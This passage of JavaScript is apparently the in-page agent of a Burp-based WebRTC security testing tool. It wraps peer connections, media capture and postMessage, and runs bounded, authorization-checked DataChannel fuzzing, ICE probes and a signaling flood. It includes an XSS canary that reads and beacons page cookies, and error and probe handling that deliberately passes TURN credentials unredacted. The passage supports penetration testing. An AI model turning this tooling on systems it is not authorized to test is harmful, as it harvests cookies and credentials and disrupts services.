        if (dc.readyState === "open") everOpened = true;
        diagnostic(dc.readyState + (dc.readyState === "closed" && !everOpened ? " before reaching open" : ""));
        if (dc.readyState === "closed") channels.delete(channelId);
        return heartbeat();
      }
      function opened() {
        var observed = state();
        if (autoRequested || dc.readyState !== "open") return;
        autoRequested = true;
        // The heartbeat must reach Burp before the fresh, scope-gated open request.
        Promise.resolve(observed).then(function () {
          if (unloading || dc.readyState !== "open" || activeCommand) return null;
          return requestBridge({ autoFuzz: channelId });
        }).then(function (doc) {
          if (!doc || !Array.isArray(doc.commands)) return;
          doc.commands.filter(function (c) { return c.type === "dc-fuzz" && c.channelId === channelId; }).forEach(dispatchCommand);
        }).catch(function () {});
      }
      dc.addEventListener("open", opened);
      dc.addEventListener("close", state);
      dc.addEventListener("error", function (e) { diagnostic("channel error" + (e && e.error ? ": " + cleanError(e.error) : ""), null, e && e.error); });
      var origClose = dc.close;
      if (typeof origClose === "function") dc.close = function () {
        var result = origClose.apply(dc, arguments);
        diagnostic("RTCDataChannel.close() called by page", "close-called");
        return result;
      };
      var where = { transport: "datachannel", pc: pcId, channelId: channelId, label: dc.label };
      dc.send = function (data) {
        var result = origSend.apply(dc, arguments);
        observeOutgoing(data, where);
        return result;
      };
      dc.addEventListener("message", function (e) { observeIncoming(e && e.data, where); });
      if (dc.readyState === "open") opened();
      else if (dc.readyState === "closed") state();
      else heartbeat();
    } catch (e) {}
  }

  function peerState(pc) {
    return { connectionState: pc.connectionState || "unknown", iceConnectionState: pc.iceConnectionState || "unknown",
      signalingState: pc.signalingState || "unknown", sctpState: pc.sctp && pc.sctp.state || "unknown" };
  }

  // jvb: Colibri bridge channel; sfu: ICE-lite media server; participant: full-ICE peer.
  function peerKind(pc) {
    var meta = pc && peerMeta.get(pc) || {};
    if (meta.colibri) return "jvb";
    if (meta.iceLite) return "sfu";
    if (meta.remote > 0) return "participant";
    return "unknown";
  }

  function finiteNumber(value) { return typeof value === "number" && isFinite(value) ? value : null; }

  function channelSummary(channelId, entry) {
    var dc = entry.dc, pc = entry.pc, sctp = pc && pc.sctp;
    return { channelId: channelId, pc: entry.pcId, label: dc.label, state: dc.readyState, protocol: dc.protocol || "",
      ordered: dc.ordered, maxRetransmits: dc.maxRetransmits, maxPacketLifeTime: dc.maxPacketLifeTime, negotiated: dc.negotiated,
      streamId: dc.id, bufferedAmount: dc.bufferedAmount, origin: entry.origin, peerKind: peerKind(pc),
      maxMessageSize: sctp ? finiteNumber(sctp.maxMessageSize) : null, maxChannels: sctp ? finiteNumber(sctp.maxChannels) : null,
      sctpState: sctp && sctp.state || "unknown" };
  }

  function socketSummary(socketId, entry) {
    return { socketId: socketId, url: entry.url, state: wsState(entry.ws), bufferedAmount: entry.ws.bufferedAmount,
      bridge: entry.hints.bridge, conference: entry.hints.conference, endpoint: entry.hints.endpoint };
  }

  function rememberSdp(desc) {
    if (desc.type === "offer") latestObservedOffer = desc.sdp;
    if (desc.type === "answer") latestObservedAnswer = desc.sdp;
  }

  function statNumber(value) {
    if (typeof value === "number" && isFinite(value)) return value;
    if (typeof value === "string" && value !== "" && isFinite(Number(value))) return Number(value);
    return null;
  }

  // One bounded getStats() snapshot: the transport/DTLS roles, the chosen ICE
  // pair and every candidate, in-use RTP streams (packet counts, loss, jitter),
  // and certificate fingerprints. Certificates are emitted once each as a
  // separate dtls-cert event carrying the DER bytes; the snapshot only references
  // their fingerprint so a long call cannot accumulate large repeated payloads.
  function reportStats(pc, pcId) {
    if (!pc.getStats) return Promise.resolve();
    return pc.getStats(null).then(function (report) {
      var stats = [];
      report.forEach(function (s) { stats.push(s); });
      var previous = statsSamples.get(pc) || {};
      statsSamples.set(pc, previous);

      var transport = null, transports = [], certs = {}, codecs = {}, candidates = {}, selectedPair = null;
      stats.forEach(function (s) {
        if (s.type === "transport") { transports.push(s); if (!transport) transport = s; }
        else if (s.type === "certificate") certs[s.id] = s;
        else if (s.type === "codec") codecs[s.id] = s;
        else if (s.type === "local-candidate" || s.type === "remote-candidate") candidates[s.id] = s;
        else if (s.type === "candidate-pair" && (s.selected || s.nominated) && s.state === "succeeded") selectedPair = s;
      });

      transports.forEach(function (transport) {
        var detail = "dtls=" + (transport.dtlsCipher || "?") + " srtp=" + (transport.srtpCipher || "?") + " tls=" + (transport.tlsVersion || "?");
        var signature = detail + " state=" + (transport.dtlsState || "?");
        if (previous[transport.id] !== signature) {
          previous[transport.id] = signature;
          beacon({ type: "crypto", pc: pcId, transportId: transport.id, dtlsState: transport.dtlsState || "unknown", detail: detail });
        }
      });

      var rtp = [];
      stats.forEach(function (s) {
        if (s.type !== "outbound-rtp" && s.type !== "inbound-rtp") return;
        if (s.isRemote === true) return;
        var outbound = s.type === "outbound-rtp";
        var codec = "";
        if (s.codecId && codecs[s.codecId] && codecs[s.codecId].mimeType) codec = codecs[s.codecId].mimeType;
        else if (s.mimeType) codec = s.mimeType;
        rtp.push({
          direction: outbound ? "outbound" : "inbound",
          kind: s.kind || s.mediaType || "",
          ssrc: s.ssrc != null ? String(s.ssrc) : "",
          payloadType: statNumber(s.payloadType),
          packets: statNumber(outbound ? s.packetsSent : s.packetsReceived),
          bytes: statNumber(outbound ? s.bytesSent : s.bytesReceived),
          packetsLost: statNumber(s.packetsLost),
          jitter: typeof s.jitter === "number" ? s.jitter : null,
          nackCount: statNumber(s.nackCount),
          pliCount: statNumber(s.pliCount),
          firCount: statNumber(s.firCount),
          codec: codec
        });
      });

      var candidateStats = [];
      stats.forEach(function (s) {
        if (s.type !== "local-candidate" && s.type !== "remote-candidate") return;
        candidateStats.push({
          role: s.type === "local-candidate" ? "local" : "remote",
          type: s.candidateType || "",
          protocol: s.protocol || "",
          address: s.address || s.ip || "",
          port: statNumber(s.port),
          priority: statNumber(s.priority),
          networkType: s.networkType || "",
          relayProtocol: s.relayProtocol || ""
        });
      });

      var pairDetail = "";
      if (selectedPair) {
        var l = candidates[selectedPair.localCandidateId];
        var r = candidates[selectedPair.remoteCandidateId];
        var la = (l && (l.address || l.ip)) || "?";
        var ra = (r && (r.address || r.ip)) || "?";
        pairDetail = la + " <-> " + ra;
        if (previous.pair !== pairDetail) {
          previous.pair = pairDetail;
          beacon({ type: "selected-pair", pc: pcId, detail: pairDetail, private: isPrivate(la) || isPrivate(ra) });
        }
      }

      var certificates = [];
      var linked = [];
      transports.forEach(function (transport) {
        if (transport.localCertificateId && certs[transport.localCertificateId]) linked.push({ role: "local", transportId: transport.id, cert: certs[transport.localCertificateId] });
        if (transport.remoteCertificateId && certs[transport.remoteCertificateId]) linked.push({ role: "remote", transportId: transport.id, cert: certs[transport.remoteCertificateId] });
      });
      if (!linked.length) stats.forEach(function (s) { if (s.type === "certificate") linked.push({ role: "unknown", cert: s }); });
      linked.slice(0, 16).forEach(function (entry) {
        var c = entry.cert;
        var base64 = typeof c.base64Certificate === "string" ? c.base64Certificate : "";
        var fingerprint = c.fingerprint || "";
        certificates.push({ role: entry.role, algorithm: c.fingerprintAlgorithm || "", fingerprint: fingerprint });
        var generation = (peerMeta.get(pc) || {})[entry.role];
        var certKey = "cert-" + c.id + ":" + entry.role + ":" + entry.transportId;
        var signature = (c.fingerprintAlgorithm || "") + ":" + fingerprint + ":" + base64 + ":" + generation;
        if (previous[certKey] !== signature) {
          previous[certKey] = signature;
          beacon({ type: "dtls-cert", pc: pcId, role: entry.role, algorithm: c.fingerprintAlgorithm || "",
            generation: generation, transportId: entry.transportId || "", mids: stats.filter(function (s) { return s.transportId === entry.transportId && s.mid != null; }).map(function (s) { return String(s.mid); }),
            fingerprint: fingerprint, base64: base64.slice(0, 16384), truncated: base64.length > 16384 });
        }
      });

      var truncated = rtp.length > 24 || candidateStats.length > 32;
      beacon({
        type: "stats-snapshot", pc: pcId, truncated: truncated,
        transport: transport ? {
          dtlsRole: transport.dtlsRole || "", iceRole: transport.iceRole || "",
          dtlsState: transport.dtlsState || "", dtlsCipher: transport.dtlsCipher || "",
          srtpCipher: transport.srtpCipher || "", tlsVersion: transport.tlsVersion || ""
        } : null,
        pair: pairDetail,
        rtp: rtp.slice(0, 24),
        candidates: candidateStats.slice(0, 32),
        certificates: certificates
      });
    }).catch(function () {});
  }

  // Capture tracks obtained by the page (camera, microphone, screen). Only the
  // kind, source and lifecycle are recorded; never media contents or device labels.
  var captureTracks = [];
  var captureSeq = 0;

  function trackCapture(stream, source) {
    try {
      var tracks = stream && typeof stream.getTracks === "function" ? stream.getTracks() : [];
      tracks.forEach(function (track) {
        if (!track) return;
        var settings = {};
        try { settings = typeof track.getSettings === "function" ? track.getSettings() || {} : {}; } catch (e) {}
        var entry = { id: "cap" + (++captureSeq), track: track, kind: track.kind || "", source: source,
          displaySurface: settings.displaySurface || "", startedAt: Date.now() };
        captureTracks.push(entry);
        if (captureTracks.length > 64) captureTracks.shift();
        beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: source, state: track.readyState || "live",
          displaySurface: entry.displaySurface, detail: source + " " + entry.kind + " track started" +
            (entry.displaySurface ? " (surface " + entry.displaySurface + ")" : "") });
        var origStop = track.stop;
        if (typeof origStop === "function") track.stop = function () {
          var result = origStop.apply(track, arguments);
          beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: source, state: "ended", action: "stop-called",
            elapsedMs: Date.now() - entry.startedAt, detail: source + " " + entry.kind + " track stopped by page" });
          return result;
        };
        if (typeof track.addEventListener === "function") track.addEventListener("ended", function () {
          beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: source, state: "ended", action: "ended-event",
            elapsedMs: Date.now() - entry.startedAt, detail: source + " " + entry.kind + " track ended (browser or user stopped capture)" });
        });
      });
    } catch (e) {}
  }

  // After a page-closed peer, check whether capture devices stay live with no open
  // peer left. A live camera, microphone or screen after hang-up is a privacy lead.
  function checkCaptureAfterClose(pcId) {
    setTimeout(function () {
      try {
        var openPeers = peersSeen.filter(function (entry) {
          return entry.pc.connectionState !== "closed" && entry.pc.signalingState !== "closed";
        }).length;
        if (openPeers > 0) return;
        captureTracks.forEach(function (entry) {
          if (entry.track.readyState !== "live" || entry.reportedAfterClose) return;
          entry.reportedAfterClose = true;
          beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: entry.source, state: "live",
            action: "live-after-close", closedPc: pcId, displaySurface: entry.displaySurface,
            detail: entry.source + " " + entry.kind + " capture is still live 3 s after the last peer connection closed" });
        });
      } catch (e) {}
    }, 3000);
  }

  function wrapGetUserMedia() {
    if (!navigator.mediaDevices) return;
    if (navigator.mediaDevices.getUserMedia) {
      var orig = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
      navigator.mediaDevices.getUserMedia = function (constraints) {
        beacon({ type: "getUserMedia", constraints: safeJson(constraints) });
        var request;
        try {
          request = orig(constraints);
        } catch (error) {
          beacon({ type: "getUserMedia-result", outcome: "rejected", error: cleanError(error) });
          throw error;
        }
        // Observe only the outcome and browser error; never collect track data,
        // device labels, or media contents.
        request.then(function (stream) {
          beacon({ type: "getUserMedia-result", outcome: "resolved" });
          trackCapture(stream, "camera/microphone");
        }, function (error) {
          beacon({ type: "getUserMedia-result", outcome: "rejected", error: cleanError(error) });
        });
        return request;
      };
    }
    if (navigator.mediaDevices.getDisplayMedia) {
      var origDisplay = navigator.mediaDevices.getDisplayMedia.bind(navigator.mediaDevices);
      navigator.mediaDevices.getDisplayMedia = function (constraints) {
        beacon({ type: "getDisplayMedia", constraints: safeJson(constraints), detail: "Screen share requested: " + safeJson(constraints) });
        var request;
        try {
          request = origDisplay(constraints);
        } catch (error) {
          beacon({ type: "capture-result", source: "screen", outcome: "rejected", error: cleanError(error), detail: "Screen share rejected: " + cleanError(error) });
          throw error;
        }
        request.then(function (stream) {
          var surfaces = [];
          try {
            stream.getVideoTracks().forEach(function (track) {
              var s = typeof track.getSettings === "function" ? track.getSettings() || {} : {};
              if (s.displaySurface) surfaces.push(s.displaySurface);
            });
          } catch (e) {}
          beacon({ type: "capture-result", source: "screen", outcome: "resolved", displaySurfaces: surfaces,
            detail: "Screen share granted" + (surfaces.length ? " (surface " + surfaces.join(", ") + ")" : "") });
          trackCapture(stream, "screen");
        }, function (error) {
          beacon({ type: "capture-result", source: "screen", outcome: "rejected", error: cleanError(error), detail: "Screen share rejected: " + cleanError(error) });
        });
        return request;
      };
    }
    if (navigator.mediaDevices.enumerateDevices) {
      var origEnumerate = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
      var enumerations = 0;
      navigator.mediaDevices.enumerateDevices = function () {
        var request = origEnumerate.apply(null, arguments);
        if (++enumerations <= 5) Promise.resolve(request).then(function (devices) {
          var counts = {}, labelled = 0;
          (devices || []).forEach(function (d) {
            counts[d.kind] = (counts[d.kind] || 0) + 1;
            if (d.label) labelled++;
          });
          // Device labels are hardware names; record only whether the page can see them.
          beacon({ type: "enumerateDevices-result", counts: counts, labelsExposed: labelled > 0, devices: (devices || []).length,
            detail: "enumerateDevices returned " + (devices || []).length + " device(s); labels " + (labelled ? "exposed" : "hidden") });
        }, function () {});
        return request;
      };
    }
  }

  // Stored-XSS canaries: payloads generated in Burp call this function. When a
  // payload executes in any instrumented page (for example an advisor console),
  // the beacon proves script execution in that page and origin.
  function installCanary() {
    var fired = {};
    function canary(id, context) {
      try {
        id = String(id || "").replace(/[^A-Za-z0-9]/g, "").slice(0, 32);
        if (!id || fired[id]) return;
        fired[id] = true;
        var cookies = "";
        try { cookies = document.cookie; } catch (e) {}
        var origin = "";
        try { origin = location.origin; } catch (e) {}
        beacon({ type: "xss-canary-fired", canaryId: id, context: String(context || "").slice(0, 64), origin: origin,
          href: (function () { try { return location.href; } catch (e) { return ""; } })(),
          readableCookies: cookies, stack: String(new Error().stack || "").slice(0, 2048),
          detail: "XSS canary " + id + " executed in " + origin });
      } catch (e) {}
    }
    try { Object.defineProperty(window, "__wrtcCanary", { value: canary, configurable: false, enumerable: false, writable: false }); }
    catch (e) { try { window.__wrtcCanary = canary; } catch (ignored) {} }
  }

  // Cross-window messaging: log message listeners (with a heuristic for origin
  // checks), the first messages per origin, and outgoing wildcard-target posts.
  function wrapMessaging() {
    if (typeof window.addEventListener !== "function") return;
    var listenerCount = 0, received = {}, sent = 0;
    function selfOrigin() { try { return location.origin; } catch (e) { return ""; } }
    function preview(data) {
      try { return (typeof data === "string" ? data : JSON.stringify(data)).slice(0, 512); } catch (e) { return "[unserializable]"; }
    }
    function source(fn) { try { return Function.prototype.toString.call(fn).slice(0, 2048); } catch (e) { return ""; } }
    function observeListener(fn, how) {
      if (typeof fn !== "function" || ++listenerCount > 20) return;
      var text = source(fn);
      var checks = /\.origin\b/.test(text);
      beacon({ type: "message-listener", how: how, checksOrigin: checks, source: text,
        detail: "message listener registered via " + how + (checks ? " (references event.origin)" : " (no event.origin reference found)") });
    }
    function observeMessage(event) {
      try {
        var origin = String(event.origin || "");
        received[origin] = (received[origin] || 0) + 1;
        if (received[origin] > 3) return;
        beacon({ type: "message-received", origin: origin, sameOrigin: origin === selfOrigin(), data: preview(event.data),
          detail: "postMessage received from " + (origin || "(opaque)") });
      } catch (e) {}
    }
    var nativeAdd = window.addEventListener;
    try {
      window.addEventListener = function (type, listener) {
        if (type === "message") observeListener(listener && listener.handleEvent ? listener.handleEvent : listener, "addEventListener");
        return nativeAdd.apply(this, arguments);
      };
      nativeAdd.call(window, "message", observeMessage, true);
    } catch (e) {}
    try {
      var descriptor = Object.getOwnPropertyDescriptor(window, "onmessage");
      if (descriptor && descriptor.configurable && descriptor.set) Object.defineProperty(window, "onmessage", {
        configurable: true, enumerable: descriptor.enumerable,
        get: function () { return descriptor.get ? descriptor.get.call(window) : null; },
        set: function (fn) { observeListener(fn, "onmessage"); descriptor.set.call(window, fn); }
      });
    } catch (e) {}
    try {
      var nativePost = window.postMessage;
      if (typeof nativePost === "function") window.postMessage = function (message, target) {
        var targetOrigin = typeof target === "string" ? target : (target && target.targetOrigin) || "/";
        if (targetOrigin === "*" && ++sent <= 10) beacon({ type: "message-sent", targetOrigin: targetOrigin, data: preview(message),
          detail: "postMessage sent with wildcard target origin" });
        return nativePost.apply(this, arguments);
      };
    } catch (e) {}
  }

  // Browser capability snapshot for permission and capture review. No media is captured.
  async function runBrowserChecks(command) {
    var result = { secureContext: !!window.isSecureContext, crossOriginIsolated: !!window.crossOriginIsolated, permissions: {}, policy: {} };
    var md = navigator.mediaDevices;
    result.getDisplayMedia = !!(md && md.getDisplayMedia);
    try { result.supportedConstraints = md && md.getSupportedConstraints ? Object.keys(md.getSupportedConstraints()).length : 0; } catch (e) {}
    try {
      if (md && md.enumerateDevices) {
        var devices = await md.enumerateDevices(), counts = {}, labelled = 0;
        devices.forEach(function (d) { counts[d.kind] = (counts[d.kind] || 0) + 1; if (d.label) labelled++; });
        result.devices = counts; result.labelsExposed = labelled > 0;
      }
    } catch (e) { result.devicesError = cleanError(e); }
    var names = ["camera", "microphone", "display-capture"];
    for (var i = 0; i < names.length; i++) {
      if (!await authorized(command)) return "cancelled";
      try {
        if (navigator.permissions && navigator.permissions.query) result.permissions[names[i]] = (await navigator.permissions.query({ name: names[i] })).state;
      } catch (e) { result.permissions[names[i]] = "unsupported"; }
      try {
        var policy = typeof document !== "undefined" && (document.permissionsPolicy || document.featurePolicy);
        if (policy && policy.allowsFeature) result.policy[names[i]] = policy.allowsFeature(names[i]);
      } catch (e) {}
    }
    try { result.framed = window.top !== window; } catch (e) { result.framed = true; }
    result.type = "browser-capabilities"; result.commandId = command.id;
    result.detail = "secureContext=" + result.secureContext + " framed=" + result.framed + " permissions=" + safeJson(result.permissions) +
      " policy=" + safeJson(result.policy) + " labelsExposed=" + result.labelsExposed;
    beacon(result);
    return "completed";
  }

  function sizeOf(data) {
    try {
      if (data == null) return 0;
      if (typeof data === "string") return new TextEncoder().encode(data).byteLength;
      if (data.byteLength != null) return data.byteLength;
      if (data.size != null) return data.size;
    } catch (e) {}
    return 0;
  }

  function safeJson(o) {
    try { return JSON.stringify(o); } catch (e) { return String(o); }
  }

  function pollCommands() {
    if (!COMMAND) return;
    var interval = 3000;
    function loop() {
      if (unloading) return;
      heartbeat();
      requestBridge({ poll: "1" })
        .then(function (doc) {
          if (!doc) return;
          // A running DataChannel suite asks every page to observe and poll faster.
          setObserving(doc.observe === true);
          interval = doc.observe === true ? 500 : 3000;
          if (!Array.isArray(doc.commands)) return;
          doc.commands.filter(function (c) { return COMMAND_TYPES.indexOf(c.type) >= 0; }).forEach(dispatchCommand);
        })
        .catch(function () {})
        .then(function () { setTimeout(loop, interval); });
    }
    loop();
  }

  var COMMAND_TYPES = ["dc-fuzz", "ice-probe", "sdp-fuzz", "capture-stats", "signaling-flood", "browser-checks",
    "dc-suite", "dc-load", "dc-churn", "dc-health", "ws-admission", "transport-action"];

  function runnerTag() {
    try { return typeof window.__WRTC_RUNNER_SESSION__ === "string" ? window.__WRTC_RUNNER_SESSION__.slice(0, 64) : ""; } catch (e) { return ""; }
  }

  function heartbeat() {
    return beacon({ type: "agent-state", version: AGENT_VERSION, runnerSession: runnerTag(), observing: observing,
      endpoint: ownEndpoint, endpointHints: endpointHints.slice(0, 32),
      sockets: Array.from(sockets.entries()).map(function (pair) { return socketSummary(pair[0], pair[1]); }),
      pcs: peersSeen.slice(-16).map(function (entry) {
        var s = peerState(entry.pc), sctp = entry.pc.sctp;
        s.pcId = entry.pcId; s.kind = peerKind(entry.pc);
        s.maxMessageSize = sctp ? finiteNumber(sctp.maxMessageSize) : null; s.maxChannels = sctp ? finiteNumber(sctp.maxChannels) : null;
        return s;
      }),
      iceServers: observedIceServers.reduce(function (urls, s) {
        var list = Array.isArray(s.urls) ? s.urls : [s.urls];
        for (var i = 0; i < list.length; i++) if (list[i] && urls.indexOf(list[i]) < 0) urls.push(list[i]);
        return urls;
      }, []),
      iceServerDetails: observedIceServers,
      channels: Array.from(channels.entries()).map(function (pair) { return channelSummary(pair[0], pair[1]); }),
      completed: completedCommands });
  }

  async function authorized(command) {
    if (unloading || location.href !== command.frame) return false;
    var doc = await requestBridge({ authorize: command.id });
    return !unloading && location.href === command.frame && !!doc && doc.authorized === true;
  }

  function dispatchCommand(command) {
    if (command.agent !== AGENT_ID || command.frame !== location.href || !command.id || seenCommands.has(command.id) || activeCommand) return;
    seenCommands.add(command.id);
    if (seenCommands.size > 256) seenCommands.delete(seenCommands.values().next().value);
    activeCommand = command.id;
    Promise.resolve().then(async function () {
      if (!await authorized(command)) return "cancelled";
      if (command.type === "dc-fuzz") return runFuzz(command);
      if (command.type === "sdp-fuzz") return runSdpFuzz(command);
      if (command.type === "capture-stats") return runCaptureStats(command);
      if (command.type === "signaling-flood") return runSignalingFlood(command);
      if (command.type === "browser-checks") return runBrowserChecks(command);
      if (command.type === "dc-suite") return runDcSuite(command);
      if (command.type === "dc-load") return runDcLoad(command);
      if (command.type === "dc-churn") return runDcChurn(command);
      if (command.type === "dc-health") return runDcHealth(command);
      if (command.type === "ws-admission") return runWsAdmission(command);
      if (command.type === "transport-action") return runTransportAction(command);
      return runIceProbe(command);
    }).catch(function (e) {
      var errType = command.type === "dc-fuzz" ? "fuzz-error"
        : command.type === "sdp-fuzz" ? "sdp-fuzz-error"
        : command.type === "capture-stats" ? "stats-capture-error"
        : command.type === "signaling-flood" ? "signaling-flood-error"
        : command.type === "browser-checks" ? "browser-checks-error"
        : command.type === "ice-probe" ? "ice-probe-error"
        : command.type + "-error";
      var errorEvent = { type: errType, commandId: command.id, detail: cleanError(e) };
      if (errType === "ice-probe-error") iceProbeEvent(command, errorEvent); else beacon(errorEvent);
      return "failed";
    }).then(function (status) {
      completedCommands.push({ commandId: command.id, status: status });
      if (completedCommands.length > 32) completedCommands.shift();
      beacon({ type: "command-result", commandId: command.id, module: command.type, status: status,
        detail: command.type + " " + command.id.slice(0, 8) + " " + status });
      activeCommand = null;
    });
  }

  function cleanError(error) {
    // Credentials are preserved in error detail on purpose. The tester controls
    // what is removed from screenshots and report evidence; nothing is redacted.
    var message = (error.name || "Error") + ": " + (error.message || String(error));
    return message.slice(0, 1024);
  }

  function fuzzPayload(cfg, index) {
    if (cfg.mode === "text") return cfg.payload;
    if (cfg.mode === "list") {
      if (!Array.isArray(cfg.payloads) || !cfg.payloads.length || cfg.payloads.length > 50) throw new Error("Invalid payload list");
      return String(cfg.payloads[index % cfg.payloads.length]);
    }
    if (cfg.mode === "hex") {
      var hex = cfg.payload.replace(/\s/g, "");
      if (!/^(?:[0-9a-fA-F]{2})*$/.test(hex)) throw new Error("Invalid hex payload");
      return new Uint8Array((hex.match(/../g) || []).map(function (b) { return parseInt(b, 16); }));
    }
    if (cfg.mode === "json") {
      var values = ['null', 'true', 'false', '0', '-1', '""', '{}', '[]', '{"type":null}', '{"value":9007199254740993}', '{"x":1,"x":2}', '{'];
      return values[index % values.length];
    }
    if (cfg.mode === "boundary") {
      var sizes = [0, 1, 255, 256, 1023, 1024, 4095, 4096, 16384, 65536].filter(function (n) { return n <= cfg.maxBytes; });
      if (sizes.indexOf(cfg.maxBytes) < 0) sizes.push(cfg.maxBytes);
      return "A".repeat(sizes[index % sizes.length]);
    }
    throw new Error("Unknown fuzz mode");
  }

  async function runFuzz(command) {
    var cfg = command.config, entry = channels.get(command.channelId), total = 0, errors = 0;
    if (!cfg || !Number.isInteger(cfg.count) || cfg.count < 1 || cfg.count > 50 ||
      !Number.isInteger(cfg.maxBytes) || cfg.maxBytes < 1 || cfg.maxBytes > 65536 || cfg.count * cfg.maxBytes > 1048576 ||
      !Number.isInteger(cfg.intervalMs) || cfg.intervalMs < 100 || cfg.intervalMs > 1000) throw new Error("Invalid fuzz limits");
    if (!entry) throw new Error("DataChannel no longer exists");
    for (var index = 0; index < cfg.count; index++) {
      if (index) await new Promise(function (resolve) { setTimeout(resolve, cfg.intervalMs); });
      if (!await authorized(command)) return "cancelled";
      var dc = entry.dc;
      if (dc.readyState !== "open") throw new Error("DataChannel is " + dc.readyState);
      if (dc.bufferedAmount > 262144) throw new Error("Stopped: DataChannel send buffer exceeds 256 KiB");
      var payload = fuzzPayload(cfg, index), bytes = sizeOf(payload);
      if (bytes > cfg.maxBytes || total + bytes > 1048576) throw new Error("Payload exceeds run byte limit");
      total += bytes;
      var event = { type: "fuzz-result", commandId: command.id, pc: entry.pcId, channelId: command.channelId,
        label: dc.label, index: index + 1, bytes: bytes, bufferedAmount: dc.bufferedAmount,
        preview: typeof payload === "string" ? payload.slice(0, 512) : Array.from(payload.slice(0, 256)).map(function (n) { return n.toString(16).padStart(2, "0"); }).join(" ") };
      try {
        var max = entry.pc.sctp && entry.pc.sctp.maxMessageSize;
        if (max > 0 && bytes > max) throw new Error("Payload exceeds negotiated SCTP maxMessageSize " + max);
        dc.send(payload);
        event.accepted = true; event.detail = "Message " + (index + 1) + ": " + bytes + " bytes accepted by send()";
      } catch (e) {
        errors++; event.accepted = false; event.detail = "Message " + (index + 1) + ": " + cleanError(e);
      }
      beacon(event);
      if (!event.accepted && cfg.stopOnError) return "failed";
    }
    return errors ? "failed" : "completed";
  }

  function iceProbeEvent(command, event) {
    var cfg = command.config || {};
    // Preserve the actual run inputs, not the current UI configuration, for comparison.
    event.url = cfg.url || "";
    event.username = cfg.username || "";
    event.credential = cfg.credential || "";
    beacon(event);
  }

  async function runIceProbe(command) {
    var cfg = command.config;
    if (!cfg || ["all", "relay"].indexOf(cfg.policy) < 0 || !Number.isInteger(cfg.timeoutSeconds) || cfg.timeoutSeconds < 3 || cfg.timeoutSeconds > 30) throw new Error("Invalid ICE probe settings");
    if (!NativePeerConnection) throw new Error("RTCPeerConnection is unavailable");
    var server = cfg.url ? { urls: cfg.url } : null;
    if (server && /^turns?:/i.test(cfg.url)) { server.username = cfg.username; server.credential = cfg.credential; }
    // Use the unwrapped constructor: probe SDP must not inherit M3 mutation rules.
    var pc = new NativePeerConnection({ iceServers: server ? [server] : [], iceTransportPolicy: cfg.policy });
    var started = Date.now(), counts = { host: 0, srflx: 0, relay: 0, prflx: 0 }, errors = 0;
    var finish, settled = false, timer, leaseTimer;
    var done = new Promise(function (resolve) { finish = function (reason) { if (!settled) { settled = true; resolve(reason); } }; });
    async function renew() {
      if (!await authorized(command)) finish("cancelled");
      if (!settled) leaseTimer = setTimeout(renew, 1000);
    }
    try {
      pc.addEventListener("icecandidate", function (e) {
        if (settled) return;
        if (!e.candidate) { finish("complete"); return; }
        var candidate = e.candidate;
        var type = candidate.type || (candidate.candidate.match(/ typ (\w+)/) || [])[1] || "unknown";
        counts[type] = (counts[type] || 0) + 1;
        iceProbeEvent(command, { type: "ice-probe-candidate", commandId: command.id, candidate: candidate.candidate,
          candidateType: type, protocol: candidate.protocol, address: candidate.address, port: candidate.port,
          elapsedMs: Date.now() - started, private: isPrivate(candidate.candidate), detail: type + " " + candidate.candidate });
      });
      pc.addEventListener("icecandidateerror", function (e) {
        if (settled) return;
        errors++;
        iceProbeEvent(command, { type: "ice-probe-error", commandId: command.id, errorCode: e.errorCode,
          detail: cleanError({ name: "ICE " + e.errorCode, message: e.errorText || "Candidate gathering error" }) });
      });
      timer = setTimeout(function () { finish("timeout"); }, cfg.timeoutSeconds * 1000);
      leaseTimer = setTimeout(renew, 1000);
      pc.createDataChannel("webrtc-ice-probe");
      // Race setup too, so a stalled browser API cannot leave a probe open indefinitely.
      var setup = Promise.resolve().then(function () { return pc.createOffer(); }).then(function (offer) {
        if (!settled) return pc.setLocalDescription(offer);
      }).then(function () { return done; });
      var reason = await Promise.race([setup, done]);
      var expected = cfg.url ? (/^turns?:/i.test(cfg.url) ? "relay" : "srflx") : "host";
      var observed = counts[expected] > 0;
      iceProbeEvent(command, { type: "ice-probe-result", commandId: command.id, reason: reason, counts: counts, errors: errors,
        expected: expected, observed: observed, elapsedMs: Date.now() - started,
        detail: reason + ": " + expected + (observed ? " candidate observed" : " candidate not observed") });
      return reason === "cancelled" ? "cancelled" : (observed ? "completed" : "failed");
    } finally {
      settled = true; clearTimeout(timer); clearTimeout(leaseTimer); pc.close();
    }
  }

  // Manual "Capture stats": force a fresh getStats() snapshot for every live
  // application peer on the page. Bounded by the peer registry (32) and the
  // snapshot caps in reportStats().
  async function runCaptureStats(command) {
    var live = peersSeen.filter(function (entry) {
      return entry.pc.connectionState !== "closed" && entry.pc.signalingState !== "closed";
    });
    if (!live.length) throw new Error("No live RTCPeerConnection on this page; join a call first");
    for (var i = 0; i < live.length; i++) {
      if (!await authorized(command)) return "cancelled";
      await reportStats(live[i].pc, live[i].pcId);
    }
    beacon({ type: "stats-capture-result", commandId: command.id, peers: live.length,
      detail: "Captured a getStats snapshot for " + live.length + " live peer(s)." });
    return "completed";
  }

  // T8 — bounded, opt-in local renegotiation/ICE-restart loop. It only drives
  // createOffer/setLocalDescription on a throwaway peer (no signaling is sent),
  // so it probes how the page's own negotiation machinery behaves and whether
  // ICE credentials are reused across restarts. Hard caps: 1-20 attempts,
  // 500-5000 ms apart, cancellation checked before every attempt.
  async function runSignalingFlood(command) {
    var cfg = command.config;
    if (!cfg || cfg.confirm !== true) throw new Error("Signaling flood is opt-in; enable it explicitly");
    if (!Number.isInteger(cfg.count) || cfg.count < 1 || cfg.count > 20 ||
      !Number.isInteger(cfg.intervalMs) || cfg.intervalMs < 500 || cfg.intervalMs > 5000) throw new Error("Invalid flood limits");
    if (!NativePeerConnection) throw new Error("RTCPeerConnection is unavailable");
    var pc = new NativePeerConnection({});
    var seen = {}, distinct = 0, reused = 0;
    try {
      for (var index = 0; index < cfg.count; index++) {
        if (index) await new Promise(function (resolve) { setTimeout(resolve, cfg.intervalMs); });
        if (!await authorized(command)) return "cancelled";
        var offer = await pc.createOffer({ iceRestart: index > 0 });
        await pc.setLocalDescription(offer);
